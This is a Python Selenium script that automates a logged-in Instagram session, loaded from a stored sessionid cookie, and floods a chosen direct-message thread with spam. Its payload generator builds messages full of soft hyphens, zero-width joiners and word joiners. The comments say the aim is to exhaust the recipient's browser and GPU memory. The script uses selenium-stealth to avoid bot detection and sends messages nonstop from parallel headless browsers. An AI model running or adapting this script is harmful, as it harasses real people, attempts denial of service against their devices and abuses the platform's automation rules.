# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (COMPOSITOR-KILL V46)
# 📅 STATUS: HARDWARE-ACCELERATION-LOCK | 4-AGENT TOTAL | AWS-GPU-TARGET

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.05, 0.15)  
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_compositor_kill_payload():
    """Generates a payload that forces GPU 'Layer-Thrashing'."""
    u_id = random.randint(100, 999)
    # \u2060 = Word Joiner | \u200D = ZWJ | \u00AD = Soft Hyphen
    # Soft hyphens force the browser to speculate on thousands of potential line breaks.
    glue, zwj, shy = "\u2060", "\u200D", "\u00AD"
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [HARDWARE_LOCK:{u_id}]"
    
    body = []
    # 420 lines - Maximizing the 'Scroll-Back' memory buffer
    for i in range(420):
        # We mix standard text with invisible 'Soft Hyphens'.
        # This tells the opponent's browser: "This line could break at 50 different spots."
        # The GPU has to keep all 50 possibilities in VRAM.
        line = f"PRAVEER{shy}PAPA{shy}ON{shy}TOP{shy}🌙{zwj}{i}{glue*12}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9995]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        # Optimization: We disable our own rendering so we never lag
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--proxy-server='direct://'")
        chrome_options.add_argument("--proxy-bypass-list=*")
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_send(driver, text):
    """Bypasses local UI bottlenecks entirely."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('insertText', false, arguments[0]);
                var e = new KeyboardEvent('keydown', {key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true});
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        driver = get_driver(agent_id)
        try:
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_compositor_kill_payload()
                if atomic_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Hardware-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 70 == 0:
                        driver.refresh()
                        time.sleep(6)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(3)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
